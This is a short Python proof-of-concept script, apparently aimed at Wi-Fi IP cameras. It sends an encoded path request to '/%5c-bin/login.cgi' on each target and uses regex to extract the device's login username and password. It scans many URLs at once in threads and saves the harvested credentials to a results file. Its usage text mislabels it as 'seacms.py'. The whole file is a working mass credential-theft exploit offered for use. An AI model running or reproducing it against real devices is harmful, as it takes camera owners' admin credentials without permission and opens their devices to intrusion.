#!/usr/bin/env python3
#-*- encoding:utf-8 -*-

import requests
import re
import sys,os,threading
'''headers={'Content-Type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.'}
with open('results.txt','r+') as file:
    for url in file.readlines():#依次读取每行'''
def wificam(url):
        url = url.strip()#去掉每行头尾空白  
        #print(url)
        uri = url + "/%5c-bin/login.cgi"

        try:
            res= requests.get(uri,timeout=4)
            username=re.findall("loginuser=\"(.*?)\"",res.text)
            password=re.findall("loginpass=\"(.*?)\"",res.text)
            final = "{}\t{}\t{}".format(url, username[0], password[0])
            with open('results.txt','a+') as f :
                f.write(final+'\n')
        except:
            #print("{}\ttimeout".format(url))
            pass


def poc(url_group):
    for url in url_group:
        try:
            wificam(url)
        except:
            continue

if __name__ == '__main__':
    urls = []
    argvs = sys.argv
    if len(argvs) < 2:
        print('''usage:python seacms.py -u url
            -u url单测
            -f filename
            -t threads(默认30)''')
        os._exit(0)

    if "-u" in argvs and "-f" not in argvs:
        urls.append(argvs[argvs.index("-u")+1])
    if "-u" not in argvs and "-f" in argvs:
        filename = argvs[argvs.index("-f")+1]
        for u in open(filename,'r').readlines():
            urls.append(u.strip())
    if "-t" in argvs:
        thread_num = int(argvs[argvs.index("-t")+1])
    else:
        thread_num = 30

    th_num = len(urls)//thread_num+1

    threads = []
    for i in range(thread_num):
        url_group = urls[th_num*i:th_num*(1+i)]
        t = threading.Thread(target=poc, args=(url_group,))
        threads.append(t)

    for t in threads:
        t.start()